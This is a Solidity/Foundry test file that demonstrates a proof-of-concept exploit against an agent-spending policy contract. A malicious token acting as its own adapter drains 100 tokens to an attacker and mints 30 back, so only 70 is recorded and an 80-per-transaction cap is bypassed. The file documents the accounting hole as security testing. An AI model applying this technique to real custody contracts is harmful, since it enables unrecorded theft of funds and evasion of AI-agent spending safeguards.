// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {AkmenaCore} from "../src/core/AkmenaCore.sol";
import {AkmenaPolicyBoundary} from "../src/authorization/AkmenaPolicyBoundary.sol";
import {AkmenaExecutionAuthorization} from "../src/authorization/AkmenaExecutionAuthorization.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/// @notice Malicious token that is ALSO its own allowlisted economic adapter.
/// Its adapter entrypoint moves `out` out of the boundary's balance to an
/// attacker, then mints only `mintBack` (< out) back to the boundary.
/// Net-delta accounting records (out - mintBack) while `out` of real value
/// leaves custody: spend is understated by `mintBack` every call.
contract PartialCreditToken is ERC20 {
    constructor() ERC20("PartialCredit", "PC") {}

    function mint(address to, uint256 amt) external {
        _mint(to, amt);
    }

    /// @dev Invoked by the boundary via executeAuthorizedAgentCall, so
    /// msg.sender == boundary. Pull `out`, mint `mintBack` back.
    function executePartial(address to, uint256 out, uint256 mintBack) external {
        _transfer(msg.sender, to, out);
        _mint(msg.sender, mintBack);
    }
}

/// @notice SCRATCH investigation (not a permanent regression test):
/// demonstrates the partial-credit gross-outflow hole. Pull-100/mint-30
/// nets to -70, so spent = 70 is recorded while 100 actually leaves.
/// A per-transaction cap set between 70 and 100 is bypassed.
contract Scratch_GrossOutflowPartialCredit is Test {
    AkmenaCore internal core;
    AkmenaPolicyBoundary internal boundary;
    AkmenaExecutionAuthorization internal auth;
    PartialCreditToken internal token;

    address internal attacker = address(0xBAD);

    uint256 internal constant AGENT_KEY = 0xA11CE;
    address internal agent;

    uint256 internal nonceCounter;

    function setUp() public {
        agent = vm.addr(AGENT_KEY);

        core = new AkmenaCore(); // test contract IS core.deployer()
        boundary = new AkmenaPolicyBoundary(address(core));
        auth = boundary.executionAuthorization();

        token = new PartialCreditToken();

        // Per-transaction cap = 80. The attack moves 100 out per call but
        // only 70 is measured, so the cap never trips.
        boundary.setAgentAssetPolicy(agent, address(token), 80 ether, 1000 ether, false);
        boundary.setEconomicAdapter(address(token), address(token), true);

        token.mint(address(boundary), 1000 ether);
    }

    function _intent(address target, bytes memory payload, address asset, uint256 amount)
        internal
        returns (AkmenaExecutionAuthorization.ExecutionIntent memory intent)
    {
        intent = AkmenaExecutionAuthorization.ExecutionIntent({
            operator: address(this),
            agent: agent,
            target: target,
            selector: bytes4(payload),
            calldataHash: keccak256(payload),
            asset: asset,
            amount: amount,
            value: 0,
            proofModuleKey: bytes32(0),
            proofId: 0,
            nonce: ++nonceCounter,
            validAfter: 0,
            deadline: block.timestamp + 1 days
        });
    }

    function _sign(AkmenaExecutionAuthorization.ExecutionIntent memory intent)
        internal
        view
        returns (bytes memory sig)
    {
        bytes32 digest = auth.hashIntent(intent);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(AGENT_KEY, digest);
        sig = abi.encodePacked(r, s, v);
    }

    function _totalSpent(address asset) internal view returns (uint256) {
        (,, uint256 totalSpentToday,,) = boundary.agentAssetPolicies(address(this), agent, asset);
        return totalSpentToday;
    }

    function _extractPartial() internal {
        bytes memory payload = abi.encodeWithSelector(
            PartialCreditToken.executePartial.selector, attacker, 100 ether, 30 ether
        );
        // Signed ceiling 80 == per-tx cap: the intent itself is policy-clean.
        AkmenaExecutionAuthorization.ExecutionIntent memory intent =
            _intent(address(token), payload, address(token), 80 ether);
        bytes memory sig = _sign(intent);

        vm.prank(agent);
        boundary.executeAuthorizedAgentCall(intent, payload, sig);
    }

    /// @notice Accounting hole: 100 leaves custody but only 70 is recorded.
    function test_partialCreditUnderstatesSpend() public {
        _extractPartial();

        assertEq(token.balanceOf(attacker), 100 ether, "attacker received the full 100");
        assertEq(token.balanceOf(address(boundary)), 930 ether, "boundary net -70");
        assertEq(
            _totalSpent(address(token)),
            70 ether,
            "HOLE: recorded 70 while 100 of value left custody (30 unrecorded)"
        );
    }

    /// @notice Policy hole: the 80-per-transaction cap is bypassed because
    /// the measured 70 sits under it while the actual 100 outflow exceeds it.
    /// The call must SUCCEED (demonstrating the bypass).
    function test_partialCreditBypassesPerTxCap() public {
        _extractPartial(); // succeeds: measured 70 <= cap 80 ...

        assertEq(token.balanceOf(attacker), 100 ether, "100 outflowed against an 80 cap");
    }
}
